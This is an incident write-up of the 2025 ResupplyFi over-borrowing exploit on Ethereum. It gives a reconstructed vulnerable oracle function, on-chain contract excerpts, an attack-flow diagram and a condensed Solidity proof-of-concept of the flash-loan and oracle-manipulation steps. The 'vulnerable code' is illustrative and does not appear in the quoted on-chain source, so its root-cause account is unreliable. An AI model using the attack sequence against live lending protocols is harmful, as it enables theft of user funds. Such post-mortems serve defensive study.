# ResupplyFi — Over-Borrowing via Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-25 |
| **Protocol** | ResupplyFi |
| **Chain** | Ethereum |
| **Loss** | ~9,600,000 USD |
| **Attacker** | [0x6d9f6e900ac2ce6770fd9f04f98b7b0fc355e2ea](https://etherscan.io/address/0x6d9f6e900ac2ce6770fd9f04f98b7b0fc355e2ea) |
| **Attack Tx** | [0xffbbd492](https://etherscan.io/tx/0xffbbd492e0605a8bb6d490c3cd879e87ff60862b0684160d08fd5711e7a872d3) |
| **Vulnerable Contract** | [0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6](https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) |
| **Root Cause** | Collateral value oracle relies on manipulable sCRVUSD pool ratio |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/ResupplyFi_exp.sol) |

---

## 1. Vulnerability Overview

ResupplyFi accepts sCRVUSD as collateral and provides loans against it. The oracle used for collateral valuation relies on the current ratio of a Curve pool. The attacker borrowed a large amount of USDC via a Morpho flash loan, manipulated the Curve pool ratio to artificially inflate the price of sCRVUSD, then used a small amount of sCRVUSD as collateral to take out an excessive loan and drain the funds.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: oracle uses manipulable current price from Curve pool
function getCollateralValue(uint256 scrvusdAmount) public view returns (uint256) {
    // curvePool.get_p() or current balance ratio — manipulable via flash loan
    uint256 price = curvePool.getCurrentPrice();
    return (scrvusdAmount * price) / 1e18;
}

function borrow(uint256 collateralAmount, uint256 borrowAmount, address receiver) external {
    uint256 collateralValue = getCollateralValue(collateralAmount);
    // LTV check passes using manipulated price
    require(borrowAmount <= collateralValue * MAX_LTV / 1e18, "LTV exceeded");
    ...
}

// ✅ Fix: use Curve EMA oracle or Chainlink
function getCollateralValue(uint256 scrvusdAmount) public view returns (uint256) {
    uint256 price = curvePool.price_oracle(); // EMA price (manipulation-resistant)
    return (scrvusdAmount * price) / 1e18;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: src/protocol/ResupplyPair.sol
function getPairAccounting()
        external
        view
        returns (
            uint256 _claimableFees,
            uint128 _totalBorrowAmount,
            uint128 _totalBorrowShares,
            uint256 _totalCollateral
        )
    {
        VaultAccount memory _totalBorrow;
        (, , _claimableFees, _totalBorrow) = previewAddInterest();
        _totalBorrowAmount = _totalBorrow.amount;
        _totalBorrowShares = _totalBorrow.shares;
        _totalCollateral = totalCollateral();
    }

// ... (lines 125-130 omitted) ...

    function toBorrowShares(
        uint256 _amount,
        bool _roundUp,
        bool _previewInterest
    ) external view returns (uint256 _shares) {
        if (_previewInterest) {
            (, , , VaultAccount memory _totalBorrow) = previewAddInterest();
            _shares = _totalBorrow.toShares(_amount, _roundUp);
        } else {
            _shares = totalBorrow.toShares(_amount, _roundUp);
        }
    }

// ... (lines 143-148 omitted) ...

    function toBorrowAmount(
        uint256 _shares,
        bool _roundUp,
        bool _previewInterest
    ) external view returns (uint256 _amount) {
        if (_previewInterest) {
            (, , , VaultAccount memory _totalBorrow) = previewAddInterest();
            _amount = _totalBorrow.toAmount(_shares, _roundUp);
        } else {
            _amount = totalBorrow.toAmount(_shares, _roundUp);
        }
    }

// ... (lines 161-175 omitted) ...

    function setOracle(address _newOracle) external onlyOwner{
        ExchangeRateInfo memory _exchangeRateInfo = exchangeRateInfo;
        emit SetOracleInfo(
            _exchangeRateInfo.oracle,
            _newOracle
        );
        _exchangeRateInfo.oracle = _newOracle;
        exchangeRateInfo = _exchangeRateInfo;
    }

// ... (lines 185-192 omitted) ...

    function setMaxLTV(uint256 _newMaxLTV) external onlyOwner{
        if (_newMaxLTV > LTV_PRECISION) revert InvalidParameter();
        emit SetMaxLTV(maxLTV, _newMaxLTV);
        maxLTV = _newMaxLTV;
    }

// ... (lines 198-207 omitted) ...

    function setRateCalculator(address _newRateCalculator, bool _updateInterest) external onlyOwner{
        //should add interest before changing rate calculator
        //however if there is an intrinsic problem with the current rate calculate, need to be able
        //to update without calling addInterest
        if(_updateInterest){
            _addInterest();
        }
        emit SetRateCalculator(address(rateCalculator), _newRateCalculator);
        rateCalculator = IRateCalculator(_newRateCalculator);
    }

// ... (lines 218-229 omitted) ...

    function setLiquidationFees(
        uint256 _newLiquidationFee
    ) external onlyOwner{
        if (_newLiquidationFee > LIQ_PRECISION) revert InvalidParameter();
        emit SetLiquidationFees(
            liquidationFee,
            _newLiquidationFee
        );
        liquidationFee = _newLiquidationFee;
    }

// ... (lines 240-288 omitted) ...

    function setMinimumLeftoverDebt(uint256 _min) external onlyOwner{
        minimumLeftoverDebt = _min;
        emit SetMinimumLeftover(_min);
    }

// ... (lines 293-295 omitted) ...

    function setMinimumBorrowAmount(uint256 _min) external onlyOwner{
        minimumBorrowAmount = _min;
        emit SetMinimumBorrowAmount(_min);
    }

// ... (lines 300-305 omitted) ...

    function setProtocolRedemptionFee(uint256 _fee) external onlyOwner{
        if(_fee > EXCHANGE_PRECISION) revert InvalidParameter();

        protocolRedemptionFee = _fee;
        emit SetProtocolRedemptionFee(_fee);
    }

// ... (lines 312-360 omitted) ...

    function setSwapper(address _swapper, bool _approval) external{
        if(msg.sender == owner() || msg.sender == registry){
            swappers[_swapper] = _approval;
            emit SetSwapper(_swapper, _approval);
        }else{
            revert OnlyProtocolOrOwner();
        }
    }

// ... (lines 369-376 omitted) ...

    function setConvexPool(uint256 pid) external onlyOwner{
        _updateConvexPool(pid);
        emit SetConvexPool(pid);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ MorphoBlue: flashLoan(large USDC amount)
  │         [onMorphoFlashLoan callback]
  │
  ├─2─▶ USDC → crvUSD swap (Curve)
  │
  ├─3─▶ crvUSD → sCRVUSD mint (inflate price)
  │         └─ sCRVUSD/crvUSD ratio distorted
  │
  ├─4─▶ Curve pool oracle manipulation (_manipulateOracles)
  │         └─ ResupplyFi price feed reflects manipulated price
  │
  ├─5─▶ ResupplyVault.addCollateralVault(sCRVUSD)
  │         └─ Collateral registered at inflated price
  │
  ├─6─▶ ResupplyVault.borrow(excessive amount)
  │         └─ Over-collateralized borrow executed beyond LTV
  │
  └─7─▶ MorphoBlue: flash loan repaid + ~9.6M USD profit retained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function onMorphoFlashLoan(uint256, bytes calldata) external {
    require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");

    // Swap USDC for crvUSD
    _swapUsdcForCrvUsd();

    // Mint sCRVUSD with crvUSD (inflate collateral price)
    uint256 crvusdBal = IERC20(crvusd).balanceOf(address(this));
    IsCRVUSD(scrvusd).mint(crvusdBal);

    // Manipulate Curve pool oracle (distort ratio)
    _manipulateOracles();

    // Add collateral to ResupplyFi at manipulated price
    uint256 scrvusdBal = IsCRVUSD(scrvusd).balanceOf(address(this));
    IsCRVUSD(scrvusd).approve(address(resupplyVault), scrvusdBal);
    IResupplyVault(resupplyVault).addCollateralVault(scrvusdBal, address(this));

    // Execute over-borrow based on manipulated collateral value
    IResupplyVault(resupplyVault).borrow(borrowAmount, 0, address(this));

    // Convert sCRVUSD back to USDC and repay flash loan
    IsCRVUSD(scrvusd).redeem(scrvusdBal, address(this), address(this));
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Oracle Manipulation |
| **Attack Vector** | Flash loan + Curve pool ratio manipulation |
| **Impact Scope** | Full lending protocol liquidity |
| **CWE** | CWE-1077 (Reliance on Untrusted External Input) |
| **DASP** | Price Manipulation / Oracle Attack |

## 6. Remediation Recommendations

1. **Use EMA Oracle**: Use Curve's `price_oracle()` (EMA) or Chainlink price feeds
2. **Extend TWAP Window**: Set oracle price update interval to a minimum of 30 minutes
3. **Conservative LTV Settings**: Apply lower LTV for derivative collateral such as sCRVUSD
4. **Borrow Limits and Anomaly Detection**: Block abnormally large borrow amounts within a single transaction

## 7. Lessons Learned

- When a collateral value oracle relies on a manipulable current pool price, it can be immediately neutralized via a flash loan attack.
- Nested derivative instruments like sCRVUSD (wrapped stablecoins) introduce additional layers of manipulability and require special scrutiny.
- Despite the ~$9.6M scale of the loss, the existence of a publicly disclosed post-mortem serves as a good example of transparent incident response.